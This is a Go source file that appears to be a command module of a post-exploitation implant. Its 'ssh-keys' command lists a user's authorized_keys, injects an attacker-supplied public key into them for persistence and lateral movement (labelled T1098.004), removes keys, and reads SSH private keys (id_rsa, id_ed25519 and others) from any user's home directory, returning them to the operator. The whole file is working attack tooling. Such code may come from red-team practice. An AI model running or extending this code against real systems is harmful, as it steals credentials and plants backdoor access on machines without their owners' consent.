//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type SSHKeysCommand struct{}

func (c *SSHKeysCommand) Name() string {
	return "ssh-keys"
}

func (c *SSHKeysCommand) Description() string {
	return "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)"
}

type sshKeysArgs struct {
	Action string `json:"action"`
	Key    string `json:"key"`
	User   string `json:"user"`
	Path   string `json:"path"`
}

func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
	var args sshKeysArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use action: list, add, remove, read-private",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return sshKeysList(args)
	case "add":
		return sshKeysAdd(args)
	case "remove":
		return sshKeysRemove(args)
	case "read-private":
		return sshKeysReadPrivate(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, add, remove, read-private", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// getSSHDir returns the .ssh directory for the target user
func getSSHDir(targetUser string) (string, error) {
	if targetUser != "" {
		u, err := user.Lookup(targetUser)
		if err != nil {
			return "", fmt.Errorf("user '%s' not found: %v", targetUser, err)
		}
		return filepath.Join(u.HomeDir, ".ssh"), nil
	}
	// Current user
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("cannot determine home directory: %v", err)
	}
	return filepath.Join(home, ".ssh"), nil
}

// sshKeysList reads authorized_keys
func sshKeysList(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	output := strings.TrimSpace(string(content))
	if output == "" {
		output = "(empty file)"
	}

	// Count keys
	lines := strings.Split(output, "\n")
	keyCount := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			keyCount++
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysAdd injects a public key into authorized_keys
func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return structs.CommandResult{
			Output:    "Error: 'key' is required (the SSH public key to inject)",
			Status:    "error",
			Completed: true,
		}
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create .ssh dir if it doesn't exist (0700 permissions)
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating %s: %v", sshDir, err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	// Read existing content
	existing, _ := os.ReadFile(authKeysPath)
	existingStr := strings.TrimRight(string(existing), "\n")

	// Check if key already exists
	if strings.Contains(existingStr, strings.TrimSpace(args.Key)) {
		return structs.CommandResult{
			Output:    "Key already exists in authorized_keys",
			Status:    "success",
			Completed: true,
		}
	}

	// Append the new key
	newContent := existingStr
	if newContent != "" {
		newContent += "\n"
	}
	newContent += strings.TrimSpace(args.Key) + "\n"

	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Injected SSH key into %s", authKeysPath),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysRemove removes a key from authorized_keys
func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return structs.CommandResult{
			Output:    "Error: 'key' is required (substring to match for removal)",
			Status:    "error",
			Completed: true,
		}
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	lines := strings.Split(string(content), "\n")
	var kept []string
	removedCount := 0
	for _, line := range lines {
		if strings.Contains(line, args.Key) {
			removedCount++
			continue
		}
		kept = append(kept, line)
	}

	if removedCount == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No keys matching '%s' found", args.Key),
			Status:    "error",
			Completed: true,
		}
	}

	newContent := strings.Join(kept, "\n")
	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysReadPrivate reads SSH private key files
func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// If a specific path is given, just read that file
	if args.Path != "" {
		content, err := os.ReadFile(args.Path)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error reading %s: %v", args.Path, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("=== %s ===\n%s", args.Path, string(content)),
			Status:    "success",
			Completed: true,
		}
	}

	// Enumerate and read common private key files
	keyFiles := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"}
	var results []string
	found := 0

	for _, name := range keyFiles {
		keyPath := filepath.Join(sshDir, name)
		content, err := os.ReadFile(keyPath)
		if err != nil {
			continue // File doesn't exist or can't be read
		}
		found++
		results = append(results, fmt.Sprintf("=== %s ===\n%s", keyPath, string(content)))
	}

	if found == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No private keys found in %s", sshDir),
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n")),
		Status:    "success",
		Completed: true,
	}
}
